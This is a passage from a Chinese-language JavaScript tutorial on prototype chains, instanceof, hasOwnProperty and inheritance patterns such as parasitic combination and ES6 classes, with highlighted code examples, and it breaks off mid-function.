console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//3</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//A { n: 1 }</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">A</span><span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//[Function]</span>

<span class="token comment">//case2</span>
<span class="token keyword">var</span> <span class="token function-variable function">F</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">a</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//这个特殊；</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
f<span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//a</span>
f<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//f.b is not a function，直接报错</span>
<span class="token constant">F</span><span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//a</span>
<span class="token constant">F</span><span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//b</span>

<span class="token comment">//case3</span>
<span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function-variable function">F</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token string">'value a'</span><span class="token punctuation">;</span>
<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token string">'value b'</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//value a</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//undefined 跟case2一样。原型链升级版中上面一条关系；</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">F</span><span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//value a 原型链升级版中上面一条关系；</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">F</span><span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//value b</span>

<span class="token comment">//case4</span>
<span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name
<span class="token punctuation">}</span>
<span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>psamy <span class="token operator">=</span> <span class="token number">111</span>
<span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//object</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Person { psamy: 111 }</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//object</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Person { psamy: 111 }</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> Person<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//function</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Person<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//[Function] //这里很特别；上面那条链；</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> Person<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//object</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Person<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//{}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> Person<span class="token punctuation">.</span><span class="token class-name">__proto__</span><span class="token punctuation">.</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//function</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Person<span class="token punctuation">.</span><span class="token class-name">__proto__</span><span class="token punctuation">.</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//[Function: Function]</span>

<span class="token comment">//case5</span>
<span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">age</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">eat</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> p2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p1<span class="token punctuation">.</span>eat <span class="token operator">===</span> p2<span class="token punctuation">.</span>eat<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>

<span class="token keyword">function</span> <span class="token function">Person2</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token class-name">Person2</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">eat</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;吃饭&quot;</span><span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> p3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person2</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> p4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person2</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p3<span class="token punctuation">.</span>eat <span class="token operator">===</span> p4<span class="token punctuation">.</span>eat<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true；原型上的方法才一样；</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br></div></div><p><strong>原型链的问题</strong></p> <p>由于原型链的存在，我们可以<strong>让很多实例去共享原型上面的方法和属性</strong>。但是原型链并非是十分完美的;<strong>当原型上面的属性是一个引用类型的值时，我们通过其中某一个实例对原型属性的更改</strong>，结果会反映在所有实例上面，这也是原型 <code>共享</code> 属性造成的最大问题; 从而引出了下面的各种继承问题；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> person2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

person1<span class="token punctuation">.</span>arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> 
person2<span class="token punctuation">.</span>arr <span class="token comment">// [1, 2, 3, 4, 5]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h5 id="重写原型链"><a href="#重写原型链" class="header-anchor">#</a> 重写原型链</h5> <p>既然原型也是对象，那可以重写这个对象</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token class-name">Person</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">'samy'</span><span class="token punctuation">,</span>
    age<span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>
    <span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Hi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Person <span class="token comment">// false</span>
p<span class="token punctuation">.</span>name <span class="token comment">// undefined</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>只是当我们<strong>在重写原型链的时候需要注意以下的问题</strong>:</p> <ul><li>在已经创建了实例的情况下重写原型，<strong>会切断现有实例与新原型之间的联系</strong></li> <li>重写原型对象，<strong>会导致原型对象的 <code>constructor</code> 属性指向 <code>Object</code> ，导致原型链关系混乱</strong>，所以应该在重写原型对象的时候指定 <code>constructor</code>( <code>instanceof</code> 仍然会返回正确的值)</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token class-name">Person</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token punctuation">{</span>
    constructor<span class="token operator">:</span> Person
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>注意：<strong>以这种方式重设 <code>constructor</code> 属性会导致它的 <code>Enumerable</code> 特性被设置成 <code>true</code>(默认为<code>false</code>);</strong></p> <p>图示重新流程：</p> <p><img src="/rat-summ/assets/img/16-03-04.59bb89e4.jpg" alt=""></p> <h5 id="关系判断"><a href="#关系判断" class="header-anchor">#</a> 关系判断</h5> <h6 id="instanceof"><a href="#instanceof" class="header-anchor">#</a> <code>instanceof</code></h6> <p>最常用的确定原型指向关系的关键字，检测的是原型,但是<strong>只能用来判断两个对象是否属于实例关系， 而不能判断一个对象实例具体属于哪种类型；</strong> 能判断是否子父孙有关系；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

p <span class="token keyword">instanceof</span> <span class="token class-name">Person</span> <span class="token comment">// true</span>
p <span class="token keyword">instanceof</span> <span class="token class-name">Object</span> <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><strong>原理</strong></p> <blockquote><p><code>instanceof</code> 内部机制是通过<strong>判断对象的原型链中是不是能找到对应的的<code>prototype</code></strong>； 正常默认只有三级到头的；</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code>  <span class="token keyword">function</span> <span class="token keyword">instanceof</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 实现 instanceof</span>
      obj <span class="token operator">=</span> obj<span class="token punctuation">.</span>__proto__<span class="token comment">// 获得对象的原型; 基础类型没有 `__proto__`</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 判断对象的类型是否等于类型的原型</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 如果__proto__ === null 说明原型链遍历完毕</span>
          <span class="token keyword">return</span> <span class="token boolean">false</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// 如果存在 obj.__proto__ === target.prototype;说明对象是该类型的实例</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token operator">===</span> target<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> <span class="token boolean">true</span>
        <span class="token punctuation">}</span>
        obj <span class="token operator">=</span> obj<span class="token punctuation">.</span>__proto__<span class="token comment">// 原型链上查找</span>
      <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h6 id="hasownproperty"><a href="#hasownproperty" class="header-anchor">#</a> <code>hasOwnProperty</code></h6> <p>通过使用 <code>hasOwnProperty</code> 可以确定<strong>访问的属性是来自于实例还是原型对象</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token comment">//Person.prototype = {</span>
<span class="token comment">//    name: 'samy'</span>
<span class="token comment">//}</span>
<span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'samy'</span>
<span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>

p<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">)</span> <span class="token comment">// true</span>
p<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span> <span class="token comment">// false</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">in</span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">}</span> <span class="token comment">// name age</span>
<span class="token comment">// 使用 hasOwnProperty</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">in</span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  p<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
<span class="token punctuation">}</span> <span class="token comment">// name</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h5 id="继承的方式【要点】"><a href="#继承的方式【要点】" class="header-anchor">#</a> 继承的方式【要点】</h5> <h6 id="常用的继承方式【原构实拷组寄6】"><a href="#常用的继承方式【原构实拷组寄6】" class="header-anchor">#</a> <strong>常用的继承方式</strong>【原构实拷组寄6】</h6> <p>方式一：【<strong>原型链继承</strong>】</p> <ul><li><strong>特点</strong>：将父类的实例作为子类的原型 ;基于原型链，既是父类的实例，也是子类的实例。</li> <li><strong>优缺点</strong> 简单易于实现,但是要想为子类新增属性和方法，必须要在new Student()这样的语句之后执行,1,<strong>无法实现多继承</strong>; 2.所有新实例都会共享父类实例的属性。</li></ul> <p>方式二：【<strong>构造继承</strong>】call继承借用构造函数继承://使用父类的构造函数来增强子类实例，等于是复制父类的实例属性给子类（没用到原型）</p> <ul><li><strong>实质</strong>是<strong>利用call继承借用构造函数继承</strong>😕/使用父类的构造函数来增强子类实例，<strong>等于是复制父类的实例属性给子类</strong>（<strong>没用到原型</strong>）</li> <li><strong>特点</strong>：可以实现多继承（call多个），解决了所有实例共享父类实例属性的问题。</li> <li><strong>优缺点</strong> 1.只能继承父类实例的属性和方法；2.不能继承原型上的属性和方法。</li></ul> <p>方式三：【<strong>实例继承</strong>】;核心：为父类实例添加新特性，作为子类实例返回[忽略]</p> <ul><li><strong>核心</strong>：为父类实例添加新特性，作为子类实例返回 ;</li> <li><strong>特点</strong>：不限制调用方式，不管是new 子类()还是子类(),返回的对象具有相同的效果</li> <li><strong>缺点</strong>：实例是父类的实例，不是子类的实例; 不支持多继承</li></ul> <p>方式四: 【<strong>拷贝继承</strong>】冒充对象继承[忽略]</p> <ul><li><p><strong>核心</strong>：冒充对象继承; 将父类的属性和方法拷贝一份到子类中；</p></li> <li><p><strong>特点</strong>： 支持多继承</p></li> <li><p><strong>缺点</strong>：效率较低，内存占用高（因为要拷贝父类的属性）</p> <p>无法获取父类不可枚举的方法（<strong>不可枚举方法，不能使用for in 访问到</strong>）</p></li></ul> <p>方式五：【<strong>组合继承</strong>】原型链+借用构造函数的组合继承;</p> <ul><li><p>核心：<strong>原型链+借用构造函数</strong>的组合继承; <strong>寄生式组合</strong>: call继承+Object.create();</p></li> <li><p><strong>特点</strong>：可以<strong>继承实例属性/方法，也可以继承原型属性/方法</strong></p></li> <li><p><strong>缺点</strong>：调用了两次父类构造函数，生成了两份实例</p></li></ul> <p>优化版本：<strong>寄生组合</strong>: call继承+Object.create();</p> <p>组合优化;  <strong>通过寄生方式，砍掉父类的实例属性</strong>，这样，<strong>在调用两次父类的构造的时候，就不会初始化两次实例方法/属性</strong>；</p> <p><strong>优缺点</strong>：优点：堪称完美；缺点：实现复杂；</p> <ul><li>与此同时原型链还能保持不变，所以可以正常使用instanceof 和 isPrototypeOf() ，所以寄生组合继承是引用类型最理想的继承方法。</li> <li>核心部分：三步走：<strong>1:修改this指向到孩子；2：设置父的属性构造为孩子；3：设置父的属性为孩子属性；</strong></li></ul> <p><strong>实现步骤</strong>：2,3步<strong>可以跟原型链图结合看使用</strong>, 就是在原型链F原型及O原型中间加入一层父的原型；</p> <ol><li><strong>继承 构造属性</strong>; <code>Person.call(this, name, age)</code></li> <li><strong>继承 原型方法</strong>; <code>Student.prototype = Object.create(Person.prototype)</code></li> <li><strong>纠正构造器</strong>;  <code>Student.prototype.constructor = Student</code> 指向回来;</li></ol> <p>用Object.create代替原来的new 操作，减少一次Person操作。详细参照: 【Object.create 和 new 区别】</p> <p>方式六： <strong>ES6 class继承</strong></p> <ul><li><p>ES5 的继承，实质是<strong>先创造子类的实例对象this</strong>，然后再将父类的方法添加到this上面（Parent.apply(this)）。</p></li> <li><p>ES6 的继承机制完全不同，实质是<strong>先将父类实例对象的属性和方法，加到this上面（所以必须先调用super方法</strong>），然后再用子类的构造函数修改this。</p></li></ul> <h6 id="寄生组合-extends对比"><a href="#寄生组合-extends对比" class="header-anchor">#</a> 寄生组合/extends对比</h6> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">,</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age
<span class="token punctuation">}</span>
<span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">setAge</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;111&quot;</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">Student</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age<span class="token punctuation">,</span> price</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">//调用你类的构造函数以初始化你类派生的成员</span>
  <span class="token function">Person</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token comment">//要点 //第二次调用Parent()</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>price <span class="token operator">=</span> price<span class="token comment">//初始化子类的成员</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">setScore</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">object</span><span class="token punctuation">(</span><span class="token parameter">o</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//== Object.create()</span>
  <span class="token comment">//function F() {}</span>
  <span class="token keyword">var</span> <span class="token function-variable function">F</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token class-name">F</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> o<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">/**
高效率体现在他只调用了一次【初始化时】Parent构造函数，并且因此避免了在Child.prototype上面创建不必要的、多余的属性。
1. 创建超类型原型的副本。
2. 为创建的副本添加constructor属性，弥补因重写原型而失去的默认的constructor属性
3. 将新创建的对象（即副本）赋值给子类型的原型这种方法只调用了一次Parent构造函数，
与此同时原型链还能保持不变，所以可以正常使用instanceof 和 isPrototypeOf() ，所以寄生组合继承是引用类型最理想的继承方法。
*/</span>
<span class="token keyword">function</span> <span class="token function">inheritPrototype</span><span class="token punctuation">(</span><span class="token parameter">child<span class="token punctuation">,</span>parent</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token comment">// var prototype = object(parent.prototype);</span>
